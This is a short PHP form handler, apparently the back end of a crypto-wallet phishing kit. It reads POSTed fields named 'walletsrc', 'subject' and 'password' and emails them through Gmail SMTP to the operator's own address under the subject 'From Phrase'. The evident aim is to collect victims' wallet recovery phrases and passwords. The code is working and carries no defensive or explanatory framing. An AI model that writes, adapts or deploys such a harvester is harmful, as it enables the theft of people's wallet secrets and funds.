<?php
if(isset($_POST['submit'])) {


	require 'PHPMailer-master/src/Exception.php';
require 'PHPMailer-master/src/PHPMailer.php';
require 'PHPMailer-master/src/SMTP.php';
			
			require 'credential.php';
			
			$mail = new PHPMailer\PHPMailer\PHPMailer(true);

			$mail->SMTPDebug = 4;                               // Enable verbose debug output

			$mail->isSMTP();                                      // Set mailer to use SMTP
			$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
			$mail->SMTPAuth = true;                               // Enable SMTP authentication
			$mail->Username = EMAIL;                 // SMTP username
			$mail->Password = PASS;                           // SMTP password
			$mail->SMTPSecure = 'ssl';                            // Enable TLS encryption, `ssl` also accepted
			$mail->Port = 465;                                    // TCP port to connect to

			$mail->setFrom(EMAIL, $_POST['walletsrc']);
			$mail->addAddress(EMAIL);     // Add a recipient

			$mail->addReplyTo(EMAIL);
			// print_r($_FILES['file']); exit;
			
			$mail->isHTML(true);                                  // Set email format to HTML
			$subject = $_POST['subject'];
			$join = $_POST['password'];
			$mail->Subject = "From Phrase";
			$mail->Body    = "$subject <br/> $join";
			$mail->AltBody = $_POST['walletsrc'];

			if(!$mail->send()) {
			    echo 'Message could not be sent.';
			   
			} else {
			    echo 'Message has been sent';
			}
		}
	 ?>

	